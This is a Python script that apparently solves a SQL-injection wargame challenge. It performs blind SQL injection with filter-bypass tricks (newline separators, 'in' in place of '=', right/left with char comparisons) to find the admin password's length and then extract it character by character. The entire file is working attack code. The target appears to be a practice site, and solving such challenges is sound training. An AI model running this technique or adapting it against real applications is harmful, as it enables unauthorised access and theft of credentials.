import urllib3
import requests
import time

flag = ""
length = 1
result = ""

session = dict(PHPSESSID="umjc6cluduib3iri1dq0uhga1a")

# find the length of PassWord
for i in range(0, 20):
    try:
        r = requests.post("https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=1%0a||%0aid%0ain(\"admin\")%0a%26%26%0alength(pw)%0ain%0a("+str(i)+")%23", cookies=session)
    except:
        print("exception_length")
        continue
        # select id from prob_orge where id='guest' and pw='' || id='admin' && length(pw)=8#

    if 'Hello admin' in r.text:
        length = i
        break

print("[+] Length of admin PW : " + str(length))
print("[+] ----------------------------------------[+]")

for k in range(1, length+1):
    for j in range(48, 126):
        try:
            r = requests.post("https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=1%0a||%0aid%0ain(\"admin\")%0a%26%26%0aright(left(pw,"+str(k)+"),1)%0ain%0a(char("+str(j)+"))%23", cookies=session)
        except:
            print("exception_flag")
            continue
        if 'Hello admin' in r.text:
            flag = flag + chr(j)
            print("[+] finding PW : " + flag)
        time.sleep(0.1)

result = flag.lower()
print("[+] pw of admin : " + result)